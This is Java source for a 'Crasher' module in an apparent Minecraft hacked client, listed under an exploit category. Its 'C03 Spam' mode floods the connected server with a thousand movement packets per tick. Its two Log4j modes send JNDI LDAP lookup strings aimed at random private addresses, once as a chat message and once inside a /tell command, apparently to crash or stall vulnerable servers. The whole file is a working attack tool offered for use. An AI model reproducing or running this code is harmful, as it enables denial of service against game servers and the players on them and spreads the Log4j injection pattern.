package me.kansio.client.modules.impl.exploit;

import com.google.common.eventbus.Subscribe;
import me.kansio.client.event.impl.UpdateEvent;
import me.kansio.client.modules.api.ModuleCategory;
import me.kansio.client.modules.api.ModuleData;
import me.kansio.client.modules.impl.Module;
import me.kansio.client.value.value.ModeValue;
import me.kansio.client.utils.network.PacketUtil;
import net.minecraft.network.play.client.C03PacketPlayer;
import org.apache.commons.lang3.RandomUtils;

@ModuleData(
        name = "Crasher",
        category = ModuleCategory.EXPLOIT,
        description = "Bean bomb"
)
public class Crasher extends Module {

    private ModeValue mode = new ModeValue("Mode", this, "C03 Spam", "Log4j", "Log4j Command");


    @Subscribe
    public void onUpdate(UpdateEvent event) {
        if (mc.thePlayer.ticksExisted < 5) {
            this.toggle();
            return;
        }
        switch (mode.getValue()) {
            case "C03 Spam": {
                PacketUtil.sendPacketNoEvent(1000, new C03PacketPlayer());
                break;
            }
            case "Log4j": {
                String url = "${jndi:ldap://192.168." + RandomUtils.nextInt(1, 253) + "." + RandomUtils.nextInt(1, 253) + "}";

                mc.thePlayer.sendChatMessage(url);
                break;
            }
            case "Log4j Command": {
                String url = "${jndi:ldap://192.168." + RandomUtils.nextInt(1, 253) + "." + RandomUtils.nextInt(1, 253) + "}";

                mc.thePlayer.sendChatMessage("/tell dfhjgjiudfg " + url);
                break;
            }
        }
    }
}
